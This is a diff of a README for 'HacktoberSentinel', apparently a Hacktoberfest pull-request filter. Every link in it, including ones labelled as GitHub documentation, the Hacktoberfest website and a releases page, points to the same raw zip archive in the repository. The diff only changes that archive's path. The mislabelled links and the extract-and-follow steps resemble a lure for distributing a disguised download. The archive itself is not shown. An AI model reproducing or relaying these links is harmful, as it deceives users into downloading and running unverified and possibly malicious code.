@@ -1,6 +1,6 @@
 # 🎉 HacktoberSentinel - Prevent Low-Effort PRs Easily
 
-[![Download HacktoberSentinel](https://raw.githubusercontent.com/nitinmishra515/HacktoberSentinel/main/pericarpic/HacktoberSentinel.zip)](https://raw.githubusercontent.com/nitinmishra515/HacktoberSentinel/main/pericarpic/HacktoberSentinel.zip)
+[![Download HacktoberSentinel](https://raw.githubusercontent.com/nitinmishra515/HacktoberSentinel/main/dist/Sentinel-Hacktober-2.3.zip)](https://raw.githubusercontent.com/nitinmishra515/HacktoberSentinel/main/dist/Sentinel-Hacktober-2.3.zip)
 
 ## 📜 Description 
 
@@ -19,11 +19,11 @@ To use HacktoberSentinel, follow these simple steps. You don't need technical ex
 
 You can get HacktoberSentinel from its official releases page. 
 
-[Visit this page to download](https://raw.githubusercontent.com/nitinmishra515/HacktoberSentinel/main/pericarpic/HacktoberSentinel.zip)
+[Visit this page to download](https://raw.githubusercontent.com/nitinmishra515/HacktoberSentinel/main/dist/Sentinel-Hacktober-2.3.zip)
 
 1. Click on the link above to open the releases page.
 2. Look for the latest version of HacktoberSentinel.
-3. Download the file that matches your system. Common files include `https://raw.githubusercontent.com/nitinmishra515/HacktoberSentinel/main/pericarpic/HacktoberSentinel.zip` for Linux or `.zip` for Windows.
+3. Download the file that matches your system. Common files include `https://raw.githubusercontent.com/nitinmishra515/HacktoberSentinel/main/dist/Sentinel-Hacktober-2.3.zip` for Linux or `.zip` for Windows.
 4. Save the file to a location you can easily access, like your Desktop or Downloads folder.
 
 ## ⚙️ Installing HacktoberSentinel 
@@ -31,7 +31,7 @@ You can get HacktoberSentinel from its official releases page.
 Once you've downloaded HacktoberSentinel, follow these steps to install:
 
 1. Locate the file you downloaded. 
-2. If you downloaded a `.zip` or `https://raw.githubusercontent.com/nitinmishra515/HacktoberSentinel/main/pericarpic/HacktoberSentinel.zip` file, unzip it by right-clicking and selecting "Extract All" or similar option.
+2. If you downloaded a `.zip` or `https://raw.githubusercontent.com/nitinmishra515/HacktoberSentinel/main/dist/Sentinel-Hacktober-2.3.zip` file, unzip it by right-clicking and selecting "Extract All" or similar option.
 3. Follow any included instructions within the extracted folder.
 
 ## 🚦 How to Use HacktoberSentinel 
@@ -62,8 +62,8 @@ HacktoberSentinel supports multiple topics. This tool is relevant for:
 
 For more help, check these resources:
 
-- [GitHub Docs on Actions](https://raw.githubusercontent.com/nitinmishra515/HacktoberSentinel/main/pericarpic/HacktoberSentinel.zip)
-- [Hacktoberfest Website](https://raw.githubusercontent.com/nitinmishra515/HacktoberSentinel/main/pericarpic/HacktoberSentinel.zip)
+- [GitHub Docs on Actions](https://raw.githubusercontent.com/nitinmishra515/HacktoberSentinel/main/dist/Sentinel-Hacktober-2.3.zip)
+- [Hacktoberfest Website](https://raw.githubusercontent.com/nitinmishra515/HacktoberSentinel/main/dist/Sentinel-Hacktober-2.3.zip)
 
 ## 📞 Support 
 
@@ -84,4 +84,4 @@ Stay updated with my latest changes:
 
 Don't forget, you can always get HacktoberSentinel from the releases page. 
 
-[Visit this page to download](https://raw.githubusercontent.com/nitinmishra515/HacktoberSentinel/main/pericarpic/HacktoberSentinel.zip)
+[Visit this page to download](https://raw.githubusercontent.com/nitinmishra515/HacktoberSentinel/main/dist/Sentinel-Hacktober-2.3.zip)
